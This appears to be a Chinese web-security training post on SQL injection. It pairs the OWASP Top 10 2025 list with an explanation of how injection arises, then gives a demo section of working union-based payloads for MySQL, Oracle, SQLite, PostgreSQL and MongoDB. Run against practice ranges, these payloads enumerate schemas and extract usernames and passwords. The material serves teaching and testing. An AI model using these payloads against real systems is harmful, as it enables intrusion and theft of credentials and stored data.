---
title: SQL注入&数据库类型&用户权限&架构分层&符号干扰&利用过程&发现思路
published: 2026-04-18 15:00:00
description: SQL注入原理详解：从数据库类型差异、符号闭合到各数据库（MySQL、Oracle、SQLite、MongoDB、PostgreSQL）的实战利用语句。
tags: [Web攻防,SQL注入]
category: 网络安全
draft: false
---

# 知识点

1. Web攻防-SQL注入-产生原理&应用因素
2. Web攻防-SQL注入-各类数据库类型利用

![image-20260418125852297](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418125852297.png)

- **[A01:2025 - Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)** maintains its position at #1 as the most serious application security risk; the contributed data indicates that on average, 3.73% of applications tested had one or more of the 40 Common Weakness Enumerations (CWEs) in this category. As indicated by the dashed line in the above figure, Server-Side Request Forgery (SSRF) has been rolled into this category.

  A01:2025 -访问控制漏洞仍然是最严重的应用程序安全风险；贡献的数据表明，平均而言，被测试的应用程序中有3.73%具有此类别中40个常见弱点枚举（CWEs）中的一个或多个。如上图虚线所示，服务器端请求伪造（Server-Side Request forged， SSRF）已归入此类别。

- **[A02:2025 - Security Misconfiguration](https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/)** moved up from #5 in 2021 to #2 in 2025. Misconfigurations are more prevalent in the data for this cycle. 3.00% of the applications tested had one or more of the 16 CWEs in this category. This is not surprising, as software engineering is continuing to increase the amount of an application’s behavior that is based on configurations.

  A02:2025 -安全配置错误从2021年的第5位上升到2025年的第2位。在这个周期的数据中，错误配置更为普遍。3.00%的测试应用程序具有此类别中的16个CWEs中的一个或多个。这并不奇怪，因为软件工程正在继续增加基于配置的应用程序行为的数量。

- **[A03:2025 - Software Supply Chain Failures](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/)** is an expansion of [A06:2021-Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) to include a broader scope of compromises occurring within or across the entire ecosystem of software dependencies, build systems, and distribution infrastructure. This category was overwhelmingly voted a top concern in the community survey. This category has 5 CWEs and a limited presence in the collected data, but we believe this is due to challenges in testing and hope that testing catches up in this area. This category has the fewest occurrences in the data, but also the highest average exploit and impact scores from CVEs.

  A03:2025 -软件供应链故障是A06:2021-脆弱和过时组件的扩展，包括在软件依赖关系、构建系统和分发基础设施的整个生态系统内或跨生态系统发生的更广泛的危害。在社区调查中，绝大多数人认为这是最受关注的问题。此类别有5个CWEs，在收集的数据中存在有限，但我们认为这是由于测试中的挑战，并希望测试能够赶上这一领域。此类别在数据中出现的次数最少，但cve的平均利用和影响得分也最高。

- **[A04:2025 - Cryptographic Failures](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/)** falls two spots from #2 to #4 in the ranking. The contributed data indicates that, on average, 3.80% of applications have one or more of the 32 CWEs in this category. This category often leads to sensitive data exposure or system compromise.

  A04:2025 -加密失败的排名从第2名下降到第4名。提供的数据表明，平均而言，3.80%的应用程序具有此类别中32个cwe中的一个或多个。这种类型通常会导致敏感数据暴露或系统泄露。

- **[A05:2025 - Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)** falls two spots from #3 to #5 in the ranking, maintaining its position relative to Cryptographic Failures and Insecure Design. Injection is one of the most tested categories, with the greatest number of CVEs associated with the 38 CWEs in this category. Injection includes a range of issues from Cross-site Scripting (high frequency/low impact) to SQL Injection (low frequency/high impact) vulnerabilities.

  A05:2025 -注入在排名中从第3位下降到第5位，保持其相对于加密失败和不安全设计的位置。注射是检测最多的类别之一，与38个CWEs相关的cve数量最多。注入包括一系列问题，从跨站脚本（高频/低影响）到SQL注入（低频/高影响）漏洞。

- **[A06:2025 - Insecure Design](https://owasp.org/Top10/2025/A06_2025-Insecure_Design/)** slides two spots from #4 to #6 in the ranking as Security Misconfiguration and Software Supply Chain Failures leapfrog it. This category was introduced in 2021, and we have seen noticeable improvements in the industry related to threat modeling and a greater emphasis on secure design.

  A06:2025 -不安全设计在排名中从第4位下滑至第6位，因为安全配置错误和软件供应链故障超越了它。这一类别是在2021年引入的，我们看到了与威胁建模相关的行业的显著改进，以及对安全设计的更加重视。

- **[A07:2025 - Authentication Failures](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/)** maintains its position at #7 with a slight name change (prevously it was “[Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)") to more accurately reflect the 36 CWEs in this category. This category remains important, but the increased use of standardized frameworks for authentication appears to be having beneficial effects on the occurrences of authentication failures.

  A07:2025 -身份验证失败保持在第7位，名称略有变化（之前是“身份验证和身份验证失败”），以更准确地反映此类别中的36个cwe。这一类仍然很重要，但是越来越多地使用标准化框架进行身份验证似乎对身份验证失败的发生产生了有益的影响。

- **[A08:2025 - Software or Data Integrity Failures](https://owasp.org/Top10/2025/A08_2025-Software_or_Data_Integrity_Failures/)** continues at #8 in the list. This category is focused on the failure to maintain trust boundaries and verify the integrity of software, code, and data artifacts at a lower level than Software Supply Chain Failures.

  A08:2025 -软件或数据完整性故障继续排在列表的第8位。此类别关注于在较低层次上维护信任边界和验证软件、代码和数据工件的完整性的失败，而不是软件供应链失败。

- **[A09:2025 - Security Logging & Alerting Failures](https://owasp.org/Top10/2025/A09_2025-Security_Logging_and_Alerting_Failures/)** retains its position at #9. This category has a slight name change (previously [Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)”) to emphasize the importance of the alerting functionality needed to induce appropriate action on relevant logging events. Great logging with no alerting is of minimal value in identifying security incidents. This category will always be underrepresented in the data, and was again voted into a position in the list from the community survey participants.

  A09:2025 -安全日志和故障警报保持在#9的位置。这个类别有一个轻微的名称更改（以前的Security Logging and Monitoring failures），以强调对相关日志事件诱导适当操作所需的警报功能的重要性。没有警报的大量日志记录在识别安全事件方面没有什么价值。这一类别在数据中总是代表性不足，并且再次从社区调查参与者中投票进入列表中的位置。

- **[A10:2025 - Mishandling of Exceptional Conditions](https://owasp.org/Top10/2025/A10_2025-Mishandling_of_Exceptional_Conditions/)** is a new category for 2025. This category contains 24 CWEs focusing on improper error handling, logical errors, failing open, and other related scenarios stemming from abnormal conditions that systems may encounter.

  A10:2025 -异常情况处理不当是2025年的新类别。此类别包含24个CWEs，重点关注系统可能遇到的异常情况导致的错误处理不当、逻辑错误、打开失败和其他相关场景。

![image-20260418130342227](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418130342227.png)

# 数据库知识

1. 数据库名，表名，列名(也叫字段)，数据

   不多做展示。

2. 自带数据库，数据库用户及权限

   ![image-20260418132107907](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418132107907.png)

   权限划分比较细致，不会造成越级。

   比较重点的就是自带的information_schema这个库：

   **SCHEMATA：记录数据库中的所有数据库名**

   **TABLES：记录所有表名**

   **COLUMNS：记录全部列名**

3. 数据库敏感函数，默认端口（3306、1521、1433、6379等）及应用

   内置函数

   **比如LOAD_FILE(file_name)**

4. 数据库查询方法（增加删除修改更新）

   不多做展示。

# SQL注入产生原理

代码中执行的SQL语句存在可控变量导致

 比如语句

```sql
select * from 'users' where id =1 
select * from 'users' where id =1 and union select ...
```

重组sql语句，

当1可控时，攻击者可以在后面加上其他sql语句，这就是sql注入的原理，这样数据库不仅执行了本身的查询语句，还会把攻击者传入的其他sql语句一起执行。

# 影响SQL注入的主要因素

## 数据库类型（权限操作）

每种数据库（比如mysql和mogodb）的语法都不同，因此也需要根据数据库来写注入语句

## 数据操作方法（增删改查）

在注入的时候要想当前执行的是什么步骤，进行的是什么操作，因为增删改查（insert、select、update、delete）的语句不同会影响你输入的sql语句

## 参数数据类型（符号干扰）

比如SQL语句

```sql
select * from 'users' where username = 'admin'
```

这里就需要单引号进行闭合，如果不闭合的情况下，在进行sql注入时，输入的语句就会变成字符串

## 参数数据格式（加密编码等）

首先是看加密方式，或者接收的编码格式（抓包推测）

![image-20260418134442972](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418134442972.png)

## 提交数据方式（数据包部分）

GET注入、POST注入、HTTP头注入

## 有无数据处理（无回显逻辑等）

 延迟注入

## 常见SQL注入的利用过程

1、判断数据库类型

2、判断参数类型及格式

3、判断数据格式及提交

4、判断数据回显及防护

5、获取数据库名，表名，列名

5、获取对应数据及尝试其他利用

## 黑盒/白盒如何发现SQL注入

1、盲对所有参数进行测试

2、整合功能点脑补进行测试

白盒参考后期代码审计课程

## 利用过程

获取数据库名->表名->列名->数据（一般是关键数据，如管理员）

# 演示

## 靶场

http://vulnweb.com/

## Access

Access：已经基本淘汰 意义不大

## Mssql

http://vulnweb.com/

## Mysql

靶场地址：https://mozhe.cn/Special/SQL_Injection

参考文章：https://blog.csdn.net/weixin_57524749/article/details/140618103

1、查看当前页面在数据库里的字段数

```sql
推测：
order by 5	// 报错
order by 4	// 正常
```

2、获取数据库名

```sql
id=-1 union select 1,database(),3,4
```

3、获取表名

group_concat()：列出所有数据

```sql
id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'
```

4、获取列名

```sql
id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='StormGroup_member'
```

5、获取相关数据

```sql
id=-1 union select 1,2,group_concat(id,name,password),4 from StormGroup_member
```

## Oracle

参考文章：https://blog.csdn.net/A2893992091/article/details/141365829

```sql
and 1=2 union select (select distinct owner from all_tables where rownum=1),'2' from dual

and 1=2 union select (select table_name from user_tables where rownum=1),'2' from dual

and 1=2 union select (select table_name from user_tables and table_name like '%user%'),'2' from dual

and 1=2 union select (select column_name from all_tab_columns where rownum=1 and table_name='sns_users'),'2' from dual
                      
and 1=2 union select (select column_name from all_tab_columns where rownum=1 and table_name='sns_users' and column_name not in ('USER_NAME')),'2' from dual
                      
and 1=2 union select USER_NAME,USER_PWD from "sns_users"
                      
and 1=2 union select USER_NAME,USER_PWD from "sns_users" where user_name not in ('hu')
```

## SQLite

参考文章：https://blog.csdn.net/qq_32393893/article/details/103083240 

```sql
union select 1,name,sql,4 from sqlite_master limit 0,1
```

```sql
union select 1,name,password,4 from WSTMart_reg
```

## MongoDB

参考文章：https://blog.csdn.net/m0_75036923/article/details/141364038

![image-20260418145202855](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260418145202855.png)

```sql
id=1'});return ({title:'1',content:'2

# 代入原查询语句
({'id':'id=1'});return ({title:'1',content:'2'}); return data;

'});return ({content:tojson(db.getCollectionNames()),title:'1

# 代入原查询语句
({'id':'id=1'});return ({content:tojson(db.getCollectionNames()),title:'1'}); return data;

'});return ({content:tojson(db.Authority_confidential.find()[0]),title:'

# 代入原查询语句
({'id':'id=1'});return ({content:tojson(db.Authority_confidential.find()[0]),title:''}); return data;
```

## PostgreSQL

参考文章：https://blog.csdn.net/2401_88387979/article/details/144275425

```sql
and 1=2 union select 'null',null,null,null

and 1=2 union select null,'null',null,null 

and 1=2 union select null,null,string_agg(datname,','),null from pg_database

and 1=2 union select null,null,string_agg(tablename,','),null from pg_tables where schemaname='public'

and 1=2 union select null,null,string_agg(column_name,','),null from information_schema.columns where table_name='reg_users'

and 1=2 union select null,string_agg(name,','),string_agg(password,','),null from reg_users
```

